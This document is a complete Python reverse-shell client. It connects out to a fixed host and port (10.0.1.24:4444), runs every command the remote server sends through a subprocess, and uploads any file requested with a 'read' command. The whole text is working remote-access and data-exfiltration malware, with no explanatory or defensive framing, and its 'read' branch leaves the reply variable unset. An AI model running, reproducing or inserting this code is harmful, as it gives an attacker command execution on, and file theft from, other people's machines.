import socket
import os
import subprocess
import sys

SERVER_HOST = "10.0.1.24"
#SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4444
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    splitted_command = command.split()

    if command.lower() == "exit":
        break
    if splitted_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splitted_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    elif splitted_command[0].lower() == 'read':
        file = splitted_command[1]
        print(file)
        if os.path.exists(file) and os.path.isfile(file):
            s.send("ok".encode("utf-8"))
            with open(file, "rb") as f:
                data = f.read()
            s.send(data)
            s.send("end".encode("utf-8"))
        else :
            s.send("error".encode("utf-8"))
    else:
        output = subprocess.getoutput(command)

    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())

s.close()
